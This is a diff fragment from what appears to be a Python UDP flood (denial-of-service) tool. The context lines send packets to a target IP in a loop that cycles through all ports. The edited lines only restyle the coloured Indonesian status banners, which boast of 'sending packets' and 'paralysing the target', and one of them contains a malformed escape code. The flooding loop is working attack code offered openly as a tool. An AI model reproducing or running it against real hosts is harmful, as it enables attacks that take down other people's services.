@@ -81,9 +81,9 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"💥\033[97m[\033[32mBASE-3\033[97m]  \033[33mMengakses  \033[92mWebs::::.... " +ip+ "\033[0m" )
-     print(f"💥\033[96m[\033[93mBASE-3\033[96m]  \033[95mMengirim  \033[96mPacket:::.... " +ip+ "\033[0m" )
-     print(f"💥\033[95m[\033[96mBASE-3\033[95m]  \033[94mMengikis  \033[32mThread:::.... " +ip+ "\033[0m" )
-     print(f"💥\033[91m[\033[94mBASE-3\033[91m]  \033[97mMelumpuhkan \094[1mTarget:::.. " +ip+ "\033[0m" )
+     print(f"💥 \033[97m[\033[32mBASE-3\033[97m]  \033[33mMengakses  \033[92mWebs::::.... " +ip+ "\033[0m" )
+     print(f"💥 \033[96m[\033[93mBASE-3\033[96m]  \033[95mMengirim  \033[96mPacket:::.... " +ip+ "\033[0m" )
+     print(f"💥 \033[95m[\033[96mBASE-3\033[95m]  \033[94mMengikis  \033[32mThread:::.... " +ip+ "\033[0m" )
+     print(f"💥 \033[91m[\033[94mBASE-3\033[91m]  \033[97mMelumpuhkan  \094[32mTarget:::.. " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
